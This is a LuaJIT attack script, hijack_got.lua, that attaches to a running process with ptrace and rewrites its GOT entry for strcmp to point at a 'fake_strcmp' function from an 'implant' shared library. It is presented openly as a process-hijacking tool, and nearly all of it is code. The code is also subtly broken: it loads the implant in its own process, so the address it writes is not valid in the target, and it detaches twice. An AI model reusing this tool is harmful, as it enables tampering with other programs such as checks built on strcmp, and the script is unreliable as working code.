#!/usr/bin/env luajit
-- hijack_got.lua
-- Inject a shared library and patch GOT in a running process

local ffi = require("ffi")

ffi.cdef[[
    long ptrace(int request, int pid, void *addr, void *data);
    int waitpid(int pid, int *status, int options);
    void *dlopen(const char *filename, int flag);
    void *dlsym(void *handle, const char *symbol);
    char *dlerror(void);
]]
    
local PTRACE_ATTACH = 16
local PTRACE_DETACH = 17
local PTRACE_PEEKDATA = 2
local PTRACE_POKEDATA = 5
local RTLD_NOW = 2

local function attach(pid)
    print(string.format("[*] Attaching to PID %d", pid))
    if ffi.C.ptrace(PTRACE_ATTACH, pid, nil, nil) ~= 0 then
        error("ptrace ATTACH failed - run with sudo")
    end
    local status = ffi.new("int[1]")
    ffi.C.waitpid(pid, status, 0)
    print("[+] Attached")
end

local function detach(pid)
    ffi.C.ptrace(PTRACE_DETACH, pid, nil, nil)
    print("[+] Detached")
end

local function read_mem(pid, addr)
    return tonumber(ffi.C.ptrace(PTRACE_PEEKDATA, pid, ffi.cast("void*", addr), nil))
end

local function write_mem(pid, addr, value)
    ffi.C.ptrace(PTRACE_POKEDATA, pid, ffi.cast("void*", addr), ffi.cast("void*", value))
end

-- Main
local pid = tonumber(arg[1])
local got_addr = tonumber(arg[2], 16)  -- Address of strcmp in GOT
local implant = arg[3] or "implants/libfake_strcmp.so"

if not pid or not got_addr then
    print("Usage: sudo luajit hijack_got.lua <pid> <got_address> [implant.so]")
    os.exit(1)
end

print(string.format("[*] Target PID: %d", pid))
print(string.format("[*] GOT address: 0x%X", got_addr))
print(string.format("[*] Implant: %s", implant))

-- Load our library in THIS process to get function address
local handle = ffi.C.dlopen(implant, RTLD_NOW)
if handle == nil then
    error("dlopen failed: " .. ffi.string(ffi.C.dlerror()))
end

local fake_func = ffi.C.dlsym(handle, "fake_strcmp")
if fake_func == nil then
    error("dlsym failed: " .. ffi.string(ffi.C.dlerror()))
end

local fake_addr = tonumber(ffi.cast("intptr_t", fake_func))
print(string.format("[+] fake_strcmp loaded at: 0x%X", fake_addr))

-- Attach to target
attach(pid)

-- Read current GOT value
local old_addr = read_mem(pid, got_addr)
print(string.format("[*] GOT[strcmp] currently points to: 0x%X", old_addr))

-- Patch it
write_mem(pid, got_addr, fake_addr)
print(string.format("[+] GOT[strcmp] now points to: 0x%X", fake_addr))

-- Verify
detach(pid)
print("[*] Hijacked: Press Enter in target. ")

detach(pid)
print("[+] Process hijacked. Press Enter in the target to see the result.")
